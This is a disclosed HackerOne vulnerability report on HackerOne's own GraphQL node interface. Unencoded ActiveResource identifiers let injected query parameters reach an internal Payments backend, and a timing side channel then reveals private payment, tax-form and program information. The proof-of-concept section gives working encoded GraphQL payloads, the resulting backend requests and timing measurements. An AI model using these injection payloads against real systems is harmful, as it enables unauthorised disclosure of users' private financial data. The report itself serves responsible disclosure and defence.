# GraphQL node interface for ActiveResource models lacks encoding for resource identifier, enabling parameter injection in Payments backend

## Report Details
- **Report ID**: 800231
- **URL**: https://hackerone.com/reports/800231
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-02-20T03:25:44.761Z
- **Disclosed**: 2020-05-11T17:53:34.131Z

## Reporter
- **Username**: jobert
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: security

## Vulnerability Information
HackerOne exposes a small number of ActiveResource objects through its GraphQL `node` interface. [ActiveResource](https://github.com/rails/activeresource) objects use HTTP as transport layer in order to fetch data. Four of these models, `TaxForm`, `Payout`, `Payment`, and `PayoutPreference` are fetched from an internal Payments backend system with a REST interface. Due to the lack of encoding the resource identifier, it is possible to inject additional parameters and point a `find` call to a difference resource endpoint.

# Proof of concept
Consider the following GraphQL query:

```
query {
  node(id: "gid://hackerone/PaymentsLibrary::Payment/1") {
    ... on User { 
      id
    }
  }
}
```

**Note**: it's important to note that the model the node identifier would return does **not** correspond with the expected GraphQL type. This is important for the exploit later in the report. This query would send the following HTTP request to HackerOne's Payments backend:

```
GET /payments/1 HTTP/1.1
...
```

Because ActiveResource does not have an opinion on identifiers, it won't encode it (e.g. it doesn't raise an exception when a string is passed instead of an integer). This means that the following GraphQL query:

```
query {
  node(id: "gid://hackerone/PaymentsLibrary::Payment/something") {
    ... on User {
      id
    }
  }
}
```

Will result in the following HTTP request:

```
GET /payments/something HTTP/1.1
...
```

Because the Payments backend uses a REST interface, the `/payments` endpoint can be used to filter by the entire set of `Payment` objects. This particular controller (and corresponding controllers for the other models) have a number of parameters that can be used to filter objects. There are 16 parameters, but the two that we'll use for the exploit:

 * core_hacker_username
 * core_team_handle

A global ID (the identifier used in the `node` interface) uses forward slashes to separate the different components (i.e. it's a URI). This means that any URL encoded character in the identifier (last) part of a global ID should be URL encoded and will be decoded when uses. This means that:

```
query {
  node(id: "gid://hackerone/PaymentsLibrary::Payment/%31") {
    ... on User {
      id
    }
  }
}
```

Will result in:

```
GET /payments/1.json HTTP/1.1
...
```

Now consider the following GraphQL query:

```
query {
  node(id: "gid://hackerone/PaymentsLibrary::Payment/%3fcore_hacker_username%3djobert%26core_team_handle%3dsecurity%26") {
    ... on User {
      id
    }
  }
}
```

Will result in:

```
GET /payments/?core_hacker_username=jobert&core_team_handle=security%26.json HTTP/1.1
...
```

**Note**: the trailing ampersand (`%26`) is used to let the router ignore the appended `.json` extension. The `PaymentsController#index` method will, as expected, return a serialized array of Payment objects that match the given parameters. The timing difference between a response without objects and a response with objects is significant enough to distinguish the two:

| Identifier | Number of objects | RTT |
| ------ | ------ | ------ |
| `%3fcore_hacker_username%3djobert%26core_team_handle%3dsecurity%26` | 0 | ~400ms |
| `%3fcore_hacker_username%3dfransrosen%26core_team_handle%3dsecurity%26` | 2 | ~2000ms |

Going back to the original query, it can be seen that it'll try to serialize a `User` object. This was necessary because not all ActiveResource models translate to a GraphQL type, such as `Payment`. Because this vulnerability can only be exploited with a timing attack it therefor doesn't matter what the response from the server is. In all cases, the server will respond with a 500 internal server error because the index endpoints of the REST interface will return an array, while the code expects a single record to be returned.

Because HackerOne exposes a sitemap with programs and user handles (and their ID), it would be rather straightforward to enumerate these and determine the information shown in the impact section of this report.

# Preliminary hypothesis on root cause
It's rather unexpected that the ActiveResource gem does not encode the resource identifier before using it in the path of an HTTP request. This behavior is also not documented from our initial investigation. Given the identifiers shown above, the expectation would be that this query:

```
query {
  node(id: "gid://hackerone/PaymentsLibrary::Payment/%3fsomething%26") {
    ... on User {
      id
    }
  }
}
```

Would result in:

```
GET /payments/%3fsomething%26.json HTTP/1.1
...
```

However, as described earlier, it results in:

```
GET /payments/?something&.json HTTP/1.1
...
```

The current thinking is that the ActiveResource gem should properly (re)encode the resource identifier before making the HTTP request.

## Impact

The timing attack can be used to determine the following information:

* roughly how many payments a user has received (not the amount, only total count!)
* the existence of a private bug bounty program
* the type of tax form a user has signed
* the default payout preference type of a user

## Attachments
No attachments
